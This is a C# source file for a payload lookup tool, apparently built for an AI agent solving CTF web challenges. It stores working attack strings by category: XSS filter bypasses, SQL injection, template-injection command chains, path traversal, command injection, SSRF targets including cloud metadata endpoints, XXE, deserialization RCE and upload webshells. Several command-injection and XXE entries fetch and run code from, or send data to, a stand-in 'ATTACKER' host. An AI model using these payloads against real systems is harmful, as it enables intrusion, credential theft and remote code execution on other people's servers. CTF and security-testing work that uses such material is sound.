// 灵枢桌面版 —— 漏洞 payload 库
//
// CTF web 题里「知道该打什么」比「会写工具」更省时间。之前模型要凭记忆
// 现编 payload：XSS 的绕过写法、SSTI 的探测链、命令注入的分隔符——
// 记错一个字符就白试一轮。
//
// 这个工具把最常用的那批存成数据，按类别取。
//
// ## 设计取向
//
// **不写「一键利用」**——payload 是素材，怎么组合要看目标的具体上下文
// （过滤了什么字符、什么框架、什么版本）。所以这里只提供**清单**，
// 每条附带一句「什么时候用」。
//
// 类别：xss / sqli / ssti / lfi / rce / ssrf / xxe / deser / upload

using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpiritScout.Tools
{
    public sealed class PayloadTool : ITool
    {
        public string Name { get { return "payload"; } }

        public string Description
        {
            get
            {
                return "漏洞 payload 速查（不是一键利用，是素材清单）。"
                     + "actions: list（有哪些类别）| get（取某类的 payload）| search（按关键词搜）。"
                     + "类别：xss / sqli / ssti / lfi / rce / ssrf / xxe / deser / upload。";
            }
        }

        public string ParametersJson
        {
            get
            {
                return @"{
  ""type"": ""object"",
  ""properties"": {
    ""action"": { ""type"": ""string"", ""enum"": [""list"", ""get"", ""search""], ""description"": ""做什么"" },
    ""category"": { ""type"": ""string"", ""description"": ""类别（get 时必填）"" },
    ""keyword"": { ""type"": ""string"", ""description"": ""search 时的关键词"" }
  },
  ""required"": [""action""]
}";
            }
        }

        /// <summary>一条 payload：内容 + 使用场景。</summary>
        private sealed class P
        {
            public string Code;
            public string When;
            public P(string code, string when) { Code = code; When = when; }
        }

        private static readonly Dictionary<string, P[]> Lib = BuildLib();

        private static Dictionary<string, P[]> BuildLib()
        {
            var d = new Dictionary<string, P[]>(StringComparer.OrdinalIgnoreCase);

            d["xss"] = new[]
            {
                new P("<script>alert(1)</script>", "最基础，先确认有没有过滤"),
                new P("<img src=x onerror=alert(1)>", "script 被过滤时的替代"),
                new P("<svg/onload=alert(1)>", "img 也被过滤时试这个"),
                new P("<body onload=alert(1)>", "属性型触发"),
                new P("javascript:alert(1)", "href/src 里注入"),
                new P("\"><script>alert(1)</script>", "属性逃逸"),
                new P("'><img src=x onerror=alert(1)>", "单引号属性逃逸"),
                new P("<scr<script>ipt>alert(1)</scr</script>ipt>", "双写绕过（过滤一次替换）"),
                new P("<SCRIPT>alert(1)</SCRIPT>", "大小写绕过"),
                new P("<img src=x onerror=\"alert(1)\">", "换引号形式"),
                new P("<img src=x onerror=alert`1`>", "反引号绕过括号过滤"),
                new P("<img src=x onerror=alert&#40;1&#41;>", "HTML 实体绕括号"),
                new P("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "base64 绕关键字"),
                new P("<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "onload 被禁时"),
                new P("<iframe srcdoc=\"<script>alert(1)</script>\">", "srcdoc 绕过"),
                new P("<math><mtext><script>alert(1)</script>", "math 标签绕过"),
                new P("<details open ontoggle=alert(1)>", "ontoggle 事件"),
                new P("<input autofocus onfocus=alert(1)>", "autofocus 自动触发"),
            };

            d["sqli"] = new[]
            {
                new P("' OR '1'='1", "最经典的万能登录"),
                new P("' OR 1=1-- -", "注释掉后半段"),
                new P("' OR 1=1#", "MySQL 的 # 注释"),
                new P("admin'-- -", "已知用户名时直接注释密码校验"),
                new P("' UNION SELECT NULL-- -", "探测列数（依次加 NULL）"),
                new P("' UNION SELECT 1,2,3-- -", "回显位探测"),
                new P("' AND 1=1-- -", "布尔盲注 true 分支"),
                new P("' AND 1=2-- -", "布尔盲注 false 分支（对比响应差异）"),
                new P("' AND SLEEP(5)-- -", "时间盲注（MySQL）"),
                new P("'; WAITFOR DELAY '0:0:5'-- -", "时间盲注（MSSQL）"),
                new P("' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -", "子查询版延时"),
                new P("' UNION SELECT @@version-- -", "MySQL 版本"),
                new P("' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables-- -", "爆表名"),
                new P("' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'-- -", "爆列名"),
                new P("' UNION SELECT 0x61646d696e-- -", "十六进制绕引号过滤"),
                new P("' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3-- -", "内联注释绕关键字过滤"),
                new P("' uniunionon selselectect 1,2,3-- -", "双写绕替换型过滤"),
                new P("' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -", "报错注入（MySQL）"),
                new P("' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -", "报错注入另一种"),
            };

            d["ssti"] = new[]
            {
                new P("{{7*7}}", "Jinja2 / Twig 通用探测"),
                new P("${7*7}", "Freemarker / JSP EL"),
                new P("#{7*7}", "Ruby ERB / Thymeleaf"),
                new P("<%= 7*7 %>", "ERB"),
                new P("{{7*'7'}}", "Jinja2 返回 49 个 7；Twig 返回 49"),
                new P("{{config}}", "Jinja2 泄露配置"),
                new P("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "Jinja2 命令执行"),
                new P("{{''.__class__.__mro__[1].__subclasses__()}}", "Jinja2 找可利用类"),
                new P("{{lipsum.__globals__['os'].popen('id').read()}}", "Jinja2 另一条链"),
                new P("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "Flask 环境"),
                new P("{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}", "无回显时的循环链"),
                new P("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "Freemarker RCE"),
                new P("__class__.mro()[1].__subclasses__()", "Python 沙箱逃逸链条起点"),
            };

            d["lfi"] = new[]
            {
                new P("../../../../etc/passwd", "Linux 基础路径穿越"),
                new P("....//....//....//etc/passwd", "绕 ../ 过滤（双写）"),
                new P("..%2f..%2f..%2fetc%2fpasswd", "URL 编码斜杠"),
                new P("..%252f..%252f..%252fetc%252fpasswd", "双重 URL 编码"),
                new P("/etc/passwd%00", "空字节截断（老 PHP）"),
                new P("/etc/passwd%00.jpg", "截断 + 假扩展名"),
                new P("php://filter/convert.base64-encode/resource=index.php", "PHP 伪协议读源码"),
                new P("php://filter/read=string.rot13/resource=index.php", "rot13 绕过滤"),
                new P("data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+", "data 伪协议写 shell"),
                new P("expect://id", "expect 扩展 RCE"),
                new P("C:\\Windows\\win.ini", "Windows 基础"),
                new P("..\\..\\..\\..\\Windows\\win.ini", "Windows 穿越"),
                new P("/proc/self/environ", "读环境变量（可能含 flag/密钥）"),
                new P("/proc/self/cmdline", "读启动命令"),
                new P("/var/log/apache2/access.log", "日志包含（配合 UA 写码）"),
            };

            d["rce"] = new[]
            {
                new P(";id", "分号分隔"),
                new P("|id", "管道"),
                new P("||id", "逻辑或"),
                new P("&id", "后台执行"),
                new P("&&id", "逻辑与"),
                new P("`id`", "反引号（命令替换）"),
                new P("$(id)", "美元括号（命令替换）"),
                new P("%0aid", "换行注入"),
                new P(";cat$IFS/etc/passwd", "IFS 绕空格过滤"),
                new P(";cat${IFS}/etc/passwd", "IFS 另一种写法"),
                new P(";c'a't /etc/passwd", "引号绕关键字"),
                new P(";ca\\t /etc/passwd", "反斜杠绕空格"),
                new P(";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash", "base64 绕关键字"),
                new P(";wget${IFS}http://ATTACKER/x -O /tmp/x;/bin/bash /tmp/x", "外带下载执行"),
                new P(";curl http://ATTACKER/$(whoami)", "DNS/HTTP 外带（无回显时）"),
                new P("^id", "Windows cmd 分隔符"),
                new P("&id", "Windows 后台"),
                new P("|id", "Windows 管道"),
                new P("%0aid", "Windows 换行"),
            };

            d["ssrf"] = new[]
            {
                new P("http://127.0.0.1:80/", "基础回环"),
                new P("http://localhost:80/", "localhost"),
                new P("http://0.0.0.0:80/", "0.0.0.0"),
                new P("http://[::1]:80/", "IPv6 回环"),
                new P("http://2130706433:80/", "127.0.0.1 的十进制"),
                new P("http://0x7f000001:80/", "十六进制"),
                new P("http://0177.0.0.1:80/", "八进制"),
                new P("http://127.1:80/", "短写"),
                new P("http://127.0.0.1.nip.io/", "DNS 重绑定到回环"),
                new P("file:///etc/passwd", "file 协议读本地"),
                new P("dict://127.0.0.1:6379/info", "dict 协议探 redis"),
                new P("gopher://127.0.0.1:6379/_INFO", "gopher 构造任意 TCP"),
                new P("http://169.254.169.254/latest/meta-data/", "AWS 元数据"),
                new P("http://metadata.google.internal/computeMetadata/v1/", "GCP 元数据（要加 header）"),
                new P("http://100.100.100.200/latest/meta-data/", "阿里云元数据"),
            };

            d["xxe"] = new[]
            {
                new P("<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY f SYSTEM \"file:///etc/passwd\">]><x>&f;</x>", "基础文件读取"),
                new P("<!DOCTYPE x [<!ENTITY f SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><x>&f;</x>", "PHP 伪协议绕解析"),
                new P("<!DOCTYPE x [<!ENTITY % p SYSTEM \"http://ATTACKER/e.dtd\">%p;]><x>&send;</x>", "外部 DTD（盲 XXE 外带）"),
                new P("<!DOCTYPE x [<!ENTITY % p SYSTEM \"file:///etc/passwd\">%p;]>", "参数实体报错带内容"),
                new P("<!DOCTYPE x SYSTEM \"file:///etc/passwd\"><x/>", "SYSTEM 直接引用"),
                new P("<!DOCTYPE x [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;\">]><x>&b;</x>", "Billion Laughs（DoS 探测是否解析实体）"),
            };

            d["deser"] = new[]
            {
                new P("rO0AB...", "Java 序列化魔数（base64 的 AC ED 00 05）"),
                new P("O:8:\"stdClass\":1:{s:1:\"a\";s:2:\"hi\";}", "PHP serialize 格式"),
                new P("a:2:{i:0;s:3:\"foo\";i:1;s:3:\"bar\";}", "PHP 数组"),
                new P("__destruct", "PHP 反序列化常见魔术方法入口"),
                new P("__wakeup", "PHP 反序列化另一入口（可用 C: 绕过）"),
                new P("ysoserial", "Java 反序列化利用链生成工具（外部）"),
                new P("!!python/object/apply:os.system [\"id\"]", "PyYAML 反序列化 RCE"),
                new P("!!python/object/new:subprocess.Popen [[\"id\"]]", "PyYAML 另一种链"),
            };

            d["upload"] = new[]
            {
                new P("shell.php", "最基础（看看有没有只查 Content-Type）"),
                new P("shell.phtml", "PHP 的替代扩展名"),
                new P("shell.php3 / .php4 / .php5 / .pht", "其他能被解析的扩展名"),
                new P("shell.php.jpg", "双扩展名"),
                new P("shell.jpg.php", "反过来写"),
                new P("shell.php%00.jpg", "空字节截断（老版本）"),
                new P("shell.php.", "Windows 会去掉末尾点"),
                new P("shell.php::$DATA", "NTFS 备用流"),
                new P(".htaccess", "上传这个再传任意文件让它被当 PHP 解析"),
                new P("AddType application/x-httpd-php .jpg", ".htaccess 的内容"),
                new P("GIF89a<?php system($_GET['c']); ?>", "图片马（加 magic 头）"),
                new P("Content-Type: image/png", "改请求头骗类型检查"),
                new P("<?=`$_GET[0]`?>", "极短 webshell"),
                new P("<?php assert($_POST[1]);?>", "assert 型（老版本）"),
            };

            return d;
        }

        public Task<ToolResult> InvokeAsync(IDictionary<string, object> args, CancellationToken ct)
        {
            string action = (Arg.Str(args, "action") ?? "").Trim().ToLowerInvariant();
            string category = (Arg.Str(args, "category") ?? "").Trim().ToLowerInvariant();
            string keyword = (Arg.Str(args, "keyword") ?? "").Trim();

            switch (action)
            {
                case "list":
                    {
                        var sb = new StringBuilder();
                        sb.Append("可用的 payload 类别（共 ").Append(Lib.Count).Append(" 类）：\n\n");
                        foreach (var kv in Lib)
                            sb.Append("  ").Append(kv.Key.PadRight(10)).Append(kv.Value.Length).Append(" 条\n");
                        sb.Append("\n用 get + category 取具体内容。");
                        return Task.FromResult(new ToolResult
                        {
                            Ok = true,
                            Output = sb.ToString(),
                            Summary = "payload · " + Lib.Count + " 类",
                        });
                    }

                case "get":
                    {
                        if (category.Length == 0) return Task.FromResult(ToolResult.Fail("get 需要 category"));
                        P[] arr;
                        if (!Lib.TryGetValue(category, out arr))
                            return Task.FromResult(ToolResult.Fail("没有这个类别：" + category
                                + "（可用：" + string.Join(" / ", new List<string>(Lib.Keys).ToArray()) + "）"));

                        var sb = new StringBuilder();
                        sb.Append("=== ").Append(category).Append(" · ").Append(arr.Length).Append(" 条 ===\n\n");
                        for (int i = 0; i < arr.Length; i++)
                        {
                            sb.Append(i + 1).Append(". ").Append(arr[i].When).Append('\n');
                            sb.Append("   ").Append(arr[i].Code).Append("\n\n");
                        }
                        sb.Append("（payload 是素材，具体要按目标的过滤和框架调整）");
                        return Task.FromResult(new ToolResult
                        {
                            Ok = true,
                            Output = sb.ToString(),
                            Summary = "payload · " + category + " · " + arr.Length + " 条",
                        });
                    }

                case "search":
                    {
                        if (keyword.Length == 0) return Task.FromResult(ToolResult.Fail("search 需要 keyword"));
                        var sb = new StringBuilder();
                        int total = 0;
                        foreach (var kv in Lib)
                        {
                            var hits = new List<P>();
                            foreach (var p in kv.Value)
                            {
                                if (p.Code.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0
                                    || p.When.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0)
                                    hits.Add(p);
                            }
                            if (hits.Count == 0) continue;
                            total += hits.Count;
                            sb.Append("=== ").Append(kv.Key).Append(" (").Append(hits.Count).Append(") ===\n");
                            foreach (var h in hits)
                                sb.Append("  ").Append(h.When).Append("\n    ").Append(h.Code).Append('\n');
                            sb.Append('\n');
                        }
                        if (total == 0) sb.Append("没找到含「").Append(keyword).Append("」的 payload。");
                        return Task.FromResult(new ToolResult
                        {
                            Ok = true,
                            Output = sb.ToString(),
                            Summary = "payload 搜索 · " + total + " 条",
                        });
                    }

                default:
                    return Task.FromResult(ToolResult.Fail("action 只能是 list / get / search"));
            }
        }
    }
}
